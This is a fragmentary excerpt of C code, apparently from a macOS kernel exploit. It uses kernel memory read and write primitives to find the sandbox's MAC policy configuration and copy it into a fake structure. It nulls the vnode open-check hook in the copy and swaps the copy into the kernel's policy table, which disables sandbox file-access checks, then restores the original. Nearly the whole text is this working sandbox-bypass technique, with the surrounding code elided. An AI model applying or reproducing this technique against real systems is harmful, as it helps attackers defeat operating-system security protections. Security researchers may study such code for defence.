...
int find_mac_policy_conf(char* mpc_name, uintptr_t* out, int* index_out) {
    ...
    for (int i=0; i<maxindex; i++) {
        ...
        uintptr_t mpc = xe_kmem_read_uint64(entry);
        char name[16];
        bzero(name, sizeof(name));
        xe_kmem_read(name, xe_kmem_read_uint64(KMEM_OFFSET(mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_NAME_OFFSET)), sizeof(name));
...
int main(int argc, const char * argv[]) {
    ...
    uintptr_t sandbox_mpo = xe_kmem_read_uint64(KMEM_OFFSET(sandbox_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET));

    xe_kmem_copy(fake_mpc, sandbox_mpc, TYPE_MAC_POLICY_CONF_SIZE);
    xe_kmem_copy(fake_mpo, sandbox_mpo, TYPE_MAC_POLICY_OPS_SIZE);
    xe_kmem_write_uint64(KMEM_OFFSET(fake_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET), fake_mpo);
    xe_kmem_write_uint64(KMEM_OFFSET(fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_OPEN_OFFSET), 0);
    
    xe_kmem_write_uint64(KMEM_OFFSET(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index), fake_mpc);
    ...
    xe_kmem_write_uint64(KMEM_OFFSET(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index), sandbox_mpc);
